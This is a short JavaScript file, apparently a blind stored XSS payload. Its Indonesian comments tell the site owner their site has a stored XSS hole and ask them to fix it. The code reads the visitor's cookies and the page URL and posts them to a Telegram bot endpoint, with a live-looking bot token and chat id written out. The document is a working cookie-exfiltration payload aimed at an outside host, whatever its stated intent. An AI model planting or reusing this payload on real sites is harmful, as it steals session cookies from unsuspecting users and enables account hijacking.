// halooooo, kalau anda di arahkan ke link berikut, berarti ada celah kemanan blind xss stored dalam web anda
// mwehehehehehe
// perbaiki yak webnya,
// stay secure

let cookies = document.cookie; 
let currentURL = window.location.href;

fetch("https://api.telegram.org/bot6592357228:AAGNYLCsNW2prmow3QvY9ieeHG-stoTJ55I/sendMessage", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        chat_id: "-1002002449257",
        text: `Cookies: ${cookies}\nURL: ${currentURL}`
    })
});


